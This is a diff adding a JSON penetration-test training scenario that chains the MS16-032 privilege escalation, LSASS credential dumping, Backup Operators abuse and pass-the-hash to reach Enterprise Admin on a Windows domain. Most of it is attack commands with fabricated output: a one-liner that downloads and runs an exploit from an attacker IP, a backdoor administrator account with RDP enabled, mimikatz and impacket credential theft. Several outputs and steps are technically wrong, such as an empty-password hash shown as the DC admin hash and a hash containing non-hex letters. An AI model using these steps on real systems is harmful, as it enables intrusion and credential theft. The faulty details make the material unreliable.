@@ -1,0 +1,85 @@
+{
+  "title": "Episode 2: Kernel Exploit Chain from Service Account to Enterprise Admin",
+  "scenario": "Internal penetration test with access to SQL Server service account (svc-sql) on Windows Server 2012 R2 database server. Account has minimal privileges and SeImpersonatePrivilege. System is unpatched with multiple kernel vulnerabilities. Objective: Chain multiple privilege escalation techniques to reach Enterprise Admin via kernel exploits and credential theft.",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Enumerate system and identify missing patches",
+      "command": "systeminfo && wmic qfe list",
+      "output": "OS: Windows Server 2012 R2\nBuild: 9600\nInstalled Hotfixes:\n  KB2919355\n  KB2919442\n  KB2937220\n\nMissing critical patches:\n  KB3139914 (MS16-032) - NOT INSTALLED\n  KB4012598 (MS17-010) - NOT INSTALLED\n  KB3143141 (MS16-075 Hot Potato) - NOT INSTALLED\n\nSystem vulnerable to multiple kernel exploits!",
+      "explanation": "Unpatched server with multiple known privilege escalation vulnerabilities"
+    },
+    {
+      "step": 2,
+      "description": "Attempt MS16-032 PowerShell exploit",
+      "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/Invoke-MS16032.ps1'); Invoke-MS16032 -Application cmd.exe -commandline '/c whoami > C:\\Temp\\proof.txt'\"",
+      "output": "[*] MS16-032 PowerShell Exploit\n[+] Found vulnerable OS version (Build 9600)\n[*] Exploiting Secondary Logon Service\n[+] Thread created in svchost.exe\n[+] Token duplicated from SYSTEM\n[+] Process created: cmd.exe /c whoami\n\nC:\\Temp> type proof.txt\nnt authority\\system\n\nMS16-032 successful - SYSTEM achieved!",
+      "explanation": "Exploited CVE-2016-0099 to escalate from service account to SYSTEM"
+    },
+    {
+      "step": 3,
+      "description": "Create persistent admin backdoor",
+      "command": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.50/Invoke-MS16032.ps1'); Invoke-MS16032 -Application cmd.exe -commandline '/c net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add && reg add HKLM\\System\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'\"",
+      "output": "[+] CreateProcessWithTokenW OK\nThe command completed successfully. (user added)\nThe command completed successfully. (admin added)\nThe operation completed successfully. (RDP enabled)\n\nPersistent backdoor established:\n  User: backdoor / P@ssw0rd!\n  Permissions: Local Administrator\n  RDP: Enabled",
+      "explanation": "Created backdoor user and enabled RDP for persistent SYSTEM access"
+    },
+    {
+      "step": 4,
+      "description": "Dump SQL Server credentials and database connection strings",
+      "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\" /s | findstr ConnectionString",
+      "output": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\MSSQL12.MSSQLSERVER\\Providers\n    ConnectionString    REG_SZ    Server=DB-PROD-01;Database=CorporateDB;User=sa;Password=SQLAdminP@ss123\n\nSQL Server SA credentials:\n  Server: DB-PROD-01\n  Username: sa\n  Password: SQLAdminP@ss123",
+      "explanation": "Extracted SQL Server connection strings with SA credentials from registry"
+    },
+    {
+      "step": 5,
+      "description": "Dump LSASS credentials with procdump",
+      "command": "C:\\Tools\\procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
+      "output": "ProcDump v10.11\n[16:30:00] Dump 1 initiated: C:\\Temp\\lsass.dmp\n[16:30:02] Dump 1 complete: 48 MB written\n\nLSASS dump created (48 MB)\nTransferring to attacker...",
+      "explanation": "Created LSASS memory dump for offline credential extraction"
+    },
+    {
+      "step": 6,
+      "description": "Extract credentials from LSASS dump offline",
+      "command": "[On attacker machine]\nmimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords",
+      "output": "Switch to MINIDUMP: lsass.dmp\n\nAuthentication Id: 0 ; 456789\nUser Name: svc-backup\nDomain: CORP\nPassword: BackupSvc2024!\nNTLM: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n\nAuthentication Id: 0 ; 567890\nUser Name: admin-desktop\nDomain: CORP\nNTLM: 64f12cddaa88057e06a81b54e73b949b\n\nOffline credential extraction successful:\n  svc-backup: BackupSvc2024!\n  admin-desktop: NTLM hash available",
+      "explanation": "Extracted domain account credentials from LSASS dump on attacker machine"
+    },
+    {
+      "step": 7,
+      "description": "Test backup service account privileges",
+      "command": "net use \\\\DC01\\C$ /user:CORP\\svc-backup BackupSvc2024!\ndir \\\\DC01\\C$",
+      "output": "The command completed successfully.\n\n Volume in drive \\\\DC01\\C$ is Windows\n Directory of \\\\DC01\\C$\n\n01/15/2024  Program Files\n01/15/2024  Windows\n01/15/2024  Users\n\nBackup account has access to DC!\nChecking group membership...\n\nnet user svc-backup /domain\nGlobal Group memberships: *Domain Users *Backup Operators\n\nBackup Operators group - can backup/restore DC!",
+      "explanation": "Backup service account is member of Backup Operators - privileged group"
+    },
+    {
+      "step": 8,
+      "description": "Abuse Backup Operators to dump SAM/SYSTEM from DC",
+      "command": "reg save HKLM\\SAM \\\\DC01\\C$\\Windows\\Temp\\sam.hive\nreg save HKLM\\SYSTEM \\\\DC01\\C$\\Windows\\Temp\\system.hive\ncopy \\\\DC01\\C$\\Windows\\Temp\\sam.hive C:\\Temp\\\ncopy \\\\DC01\\C$\\Windows\\Temp\\system.hive C:\\Temp\\",
+      "output": "The operation completed successfully. (SAM)\nThe operation completed successfully. (SYSTEM)\n        1 file(s) copied.\n        1 file(s) copied.\n\nDC registry hives extracted via Backup Operators privilege",
+      "explanation": "Backup Operators can read any file - extracted DC SAM and SYSTEM hives"
+    },
+    {
+      "step": 9,
+      "description": "Extract DC local admin hash from SAM",
+      "command": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
+      "output": "Impacket v0.10.0\n\n[*] Target system bootKey: 0x12345678901234567890123456789012\n[*] Dumping local SAM hashes\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\nDC local Administrator hash:\n  NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0",
+      "explanation": "Extracted DC local administrator NTLM hash for Pass-the-Hash attack"
+    },
+    {
+      "step": 10,
+      "description": "Pass-the-Hash to DC and dump domain database",
+      "command": "impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@10.10.10.10",
+      "output": "Impacket v0.10.0\n[*] Requesting shares on 10.10.10.10.....\n[*] Found writable share ADMIN$\n[*] Uploading file\n[*] Opening SVCManager on 10.10.10.10.....\n[*] Starting service\n\nMicrosoft Windows [Version 10.0.14393]\nC:\\Windows\\system32> whoami\nnt authority\\system\n\nC:\\Windows\\system32> hostname\nDC01\n\nC:\\Windows\\system32> mimikatz \"lsadump::dcsync /user:CORP\\Enterprise Admins\" exit\n\nDomain: CORP\nGroup: Enterprise Admins\nMembers:\n  - Administrator (Enterprise Admin)\n  - EA-Admin (Enterprise Admin)\n\nNTLM hashes:\n  Administrator: 31d6cfe0d16ae931b73c59d7e0c089c0\n  EA-Admin: 9f86d081884c7d659a2feaa0c55ad015...\n\nEnterprise Admin credentials obtained!",
+      "explanation": "Used Pass-the-Hash to access DC as SYSTEM and dumped Enterprise Admin credentials"
+    }
+  ],
+  "outcome": "Successfully chained MS16-032 kernel exploit from SQL service account to SYSTEM, extracted multiple domain credentials from LSASS, abused Backup Operators group membership to dump DC registry hives, performed Pass-the-Hash attack on Domain Controller, and obtained Enterprise Admin credentials. Demonstrated complete privilege escalation chain from service account to highest domain privileges.",
+  "learning_objectives": [
+    "Identify and exploit Windows kernel vulnerabilities (MS16-032)",
+    "Chain multiple privilege escalation techniques",
+    "Extract credentials from LSASS memory dumps offline",
+    "Abuse Backup Operators group for file access",
+    "Perform Pass-the-Hash attacks with NTLM hashes",
+    "Escalate from Domain Admin to Enterprise Admin"
+  ]
+}
